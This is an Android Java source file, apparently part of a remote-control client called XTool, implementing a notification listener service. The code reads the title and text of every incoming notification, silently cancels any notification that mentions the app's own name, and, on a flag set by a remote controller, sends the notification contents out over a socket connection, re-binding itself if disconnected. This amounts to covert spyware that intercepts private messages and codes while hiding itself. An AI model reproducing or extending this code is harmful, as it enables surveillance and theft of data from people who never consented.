package com.xc.XTool.ClientService;

import android.app.Notification;
import android.content.ComponentName;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.xc.XTool.MainActivity;

import java.nio.charset.StandardCharsets;

public class NotificationListener extends NotificationListenerService {

    private static final String TAG = "NotificationListener";

    public static boolean noti_state = false;

    public NotificationListener() {
    }



    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        noti_state = true;
        Notification notification = sbn.getNotification();
        Bundle extras = notification.extras;
//        if(Objects.equals(sbn.getPackageName(), "com.huawei.systemmanager")) {
//            cancelNotification(sbn.getKey());
//        }
//        cancelNotification(sbn.getKey());
//        snoozeNotification(sbn.getKey());
//        snoozeNotification();
        if(extras != null) {
//            Log.e(TAG, "onNotificationPosted: " + sbn.getPackageName());
            String title = extras.getString(Notification.EXTRA_TITLE,"");
            String body = extras.getString(Notification.EXTRA_TEXT,"");
            if(body.contains(MainActivity.APP_NAME) || title.contains(MainActivity.APP_NAME)) {
//                Log.e(TAG, "onNotificationPosted: 移除通知" );
                cancelNotification(sbn.getKey());
            }

            Log.e("标题：",title);
            Log.e("内容：", body);
//            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINESE).format(new Date(sbn.getPostTime()));
//            Log.e("时间：", time);
            if(ClientService.getFaceTextState) {
//                String time = new SimpleDateFormat("yyyy-MM-dd-HH:mm:ss", Locale.CHINESE).format(new Date(System.currentTimeMillis()));
                String str = "\n\n\n\n" +
                        "通知:\n" +
                        "    标题: [" +
                        title +
                        "]\n" +
                        "    内容: [" +
                        body +
                        "]\n";

                byte[] data = str.getBytes(StandardCharsets.UTF_8);
                int len = data.length;
                data[0] = (byte) 0XFF;
                data[1] = (byte) ((len >> 16) & 0XFF);
                data[2] = (byte) ((len >> 8) & 0XFF);
                data[3] = (byte) (len & 0XFF);
                try {
                    SocketClient.putSendData(data);
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
//                    ClientService.stopGetFaceText();
                    ClientService.sendMsg(ClientService.STOP_GET_FACE_TEXT);
                }
//                if(!SocketClient.putSendData(stringBuilder.toString().getBytes())) {
//                    ClientService.stopGetFaceText();
//                }
            }
//            Toast.makeText(this,extras.getString(Notification.EXTRA_TEXT,""),Toast.LENGTH_LONG).show();
        }
//        if(MyAccessibilityService.clientService != null) {
//            MyAccessibilityService.clientService.startService();
//        }


    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);

        Log.e(TAG, "onNotificationRemoved: 通知移除" + sbn.toString());
    }

    @Override
    public void onListenerDisconnected() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            // 通知侦听器断开连接 - 请求重新绑定
            requestRebind(new ComponentName(this, NotificationListenerService.class));
        }
    }
}